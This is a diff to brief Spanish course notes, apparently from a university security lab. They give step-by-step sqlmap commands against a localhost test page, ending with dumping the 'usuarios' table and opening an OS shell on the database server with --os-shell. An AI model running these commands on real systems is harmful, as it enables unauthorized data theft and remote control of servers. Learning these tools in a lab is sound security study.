@@ -1,3 +1,27 @@
 sqlmap paso a paso
 
-cd "C:\Users\plucero\Google Drive\USAL\4to\Seg informatica\capital\2017\tp seguridad\sql injection\sqlmap"
+	cd "C:\Users\plucero\Google Drive\USAL\4to\Seg informatica\capital\2017\tp seguridad\sql injection\sqlmap"
+
+Usar el flag -h Para ver las opciones del programa.
+
+	python sqlmap.py -h
+
+--batch se usa para que no pida user input. --banner Retrieve DBMS banner (marca y version de la DB)
+
+	python sqlmap.py -u "http://localhost/tp-seguridad/detalle_articulo.php?id=1" --batch --banner
+
+--dbs muestra las diferentes bases de datos
+
+	python sqlmap.py -u "http://localhost/tp-seguridad/detalle_articulo.php?id=1" --batch --dbs
+
+--tables -D tp-seguridad muestra los nombres de las tablas en la db tp-seguridad
+
+	python sqlmap.py -u "http://localhost/tp-seguridad/detalle_articulo.php?id=1" --batch --tables -D tp-seguridad
+
+con --dump -T usuarios -D tp-seguridad muestro todo el contenido de la tabla usuarios
+
+	python sqlmap.py -u "http://localhost/tp-seguridad/detalle_articulo.php?id=1" --batch --dump -T usuarios -D tp-seguridad
+
+con --os-shell abro una consola en el servidor donde esta corriendo la DB
+
+	python sqlmap.py -u "http://localhost/tp-seguridad/detalle_articulo.php?id=1" --batch --os-shell
